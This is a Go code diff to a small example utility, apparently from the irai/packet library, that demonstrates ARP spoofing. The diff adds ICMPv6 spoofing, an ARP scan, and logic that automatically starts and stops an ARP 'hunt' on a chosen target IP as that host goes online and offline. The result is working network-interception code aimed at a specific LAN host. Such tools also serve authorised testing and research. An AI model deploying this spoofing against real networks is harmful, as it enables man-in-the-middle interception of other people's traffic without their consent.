@@ -8,6 +8,7 @@ import (
 
 	"github.com/irai/packet"
 	"github.com/irai/packet/arp"
+	"github.com/irai/packet/icmp"
 )
 
 // Simple utility to demonstrate use of ARP spoofing
@@ -15,6 +16,41 @@ var (
 	nic   = flag.String("i", "eth0", "nic interface")
 	ipstr = flag.String("ip", "", "target ip address as in 192.168.0.30")
 	debug = flag.Bool("d", false, "set to true to show debug messages")
+)
+
+func processNotification(s *packet.Session, targetIP net.IP) {
+	for {
+		notification := <-s.C
+		switch notification.Online {
+		case true:
+			if !notification.Addr.IP.Equal(targetIP) {
+				fmt.Printf("host is online: %s\n", notification)
+				continue
+			}
+			fmt.Println("target ip is online", targetIP)
+			if _, err := arpSpoofer.StartHunt(notification.Addr); err != nil {
+				fmt.Println("error in start arp hunt", err)
+				return
+			}
+
+		default:
+			if !notification.Addr.IP.Equal(targetIP) {
+				fmt.Printf("host is offline: %s\n", notification)
+				continue
+			}
+			fmt.Println("target ip is offline", targetIP)
+			if _, err := arpSpoofer.StopHunt(notification.Addr); err != nil {
+				fmt.Println("error in stop arp hunt", err)
+				return
+			}
+		}
+		s.PrintTable()
+	}
+}
+
+var (
+	arpSpoofer   *arp.Handler
+	icmp6Spoofer *icmp.Handler6
 )
 
 func main() {
@@ -28,27 +64,29 @@ func main() {
 		fmt.Printf("conn error: %s", err)
 		return
 	}
-
-	go func() {
-		for {
-			notification := <-s.C
-			switch notification.Online {
-			case true:
-				fmt.Printf("is online: %s\n", notification)
-			default:
-				fmt.Printf("is offline: %s\n", notification)
-			}
-			s.PrintTable()
-		}
-	}()
+	defer s.Close()
 
 	arp.Debug = *debug
 	packet.Debug = *debug
-	arpspoofer, err := arp.New(s)
+
+	// instanciate the arp spoofer
+	arpSpoofer, err = arp.New(s)
 	if err != nil {
 		fmt.Println("error creating arp spoofer", err)
 		return
 	}
+	defer arpSpoofer.Close()
+
+	// instanciate the icmp6 spoofer
+	icmp6Spoofer, err = icmp.New6(s)
+	if err != nil {
+		fmt.Println("error creating arp spoofer", err)
+		return
+	}
+	defer icmp6Spoofer.Close()
+
+	// start goroutinge to process notifications
+	go processNotification(s, ip)
 
 	// Start packet processing goroutine
 	go func() {
@@ -66,32 +104,54 @@ func main() {
 				continue
 			}
 
-			// Process ARP packets only - ignore all other
-			if arp := frame.ARP(); arp != nil {
-				arpspoofer.Spoof(frame)
+			switch frame.PayloadID {
+			case packet.PayloadARP:
+				// Process arp packets
+				if err := arpSpoofer.Spoof(frame); err != nil {
+					fmt.Println("error processing arp packet", err)
+				}
+			case packet.PayloadICMP6:
+				// Process icmpv6 packets
+				if err := icmp6Spoofer.Spoof(frame); err != nil {
+					fmt.Println("error processing icmp6 packet", err)
+				}
 			}
 
 			s.SetOnline(frame.Host)
 		}
 	}()
 
-	// Start arp spoofer module
-	arpspoofer.Start()
-	defer arpspoofer.Stop()
-
-	// start hunt for target IP
+	// if not ip given, just listen...
 	if ip = net.ParseIP(*ipstr); ip == nil {
 		fmt.Println("missing or invalid target ip address...listening only", err)
-	} else {
-		if addr, err := s.ARPWhoIs(ip); err != nil {
+		time.Sleep(time.Hour * 24) // wait forever!!!
+	}
+
+	// send arp scan
+	s.ARPScan()
+
+	// Start icmpv6 spoofer module
+	icmp6Spoofer.Start()
+
+	/***
+	switch {
+	case ip.To4() != nil:
+		// send arp discovery packet
+		if _, err := s.ARPWhoIs(ip); err != nil {
 			fmt.Printf("ip=%s not found on LAN - listening only: %v\n", ip, err)
-		} else {
-			if _, err := arpspoofer.StartHunt(addr); err != nil {
-				fmt.Println("error in start hunt", err)
-				return
-			}
+			break
+		}
+	default:
+		if s.NICInfo.HostLLA.IP == nil {
+			fmt.Println("host does not have IPv6 local link address")
+			return
+		}
+		// send icmpv6 discovery packet
+		if err := s.ICMP6SendEchoRequest(packet.Addr{MAC: s.NICInfo.HostMAC, IP: s.NICInfo.HostLLA.IP}, packet.Addr{MAC: packet.EthBroadcast, IP: ip}, 100, 1); err != nil {
+			fmt.Println("failed to send icmp6 echo request", err)
 		}
 	}
+	***/
 
 	time.Sleep(time.Hour * 24) // wait forever!!!
 }
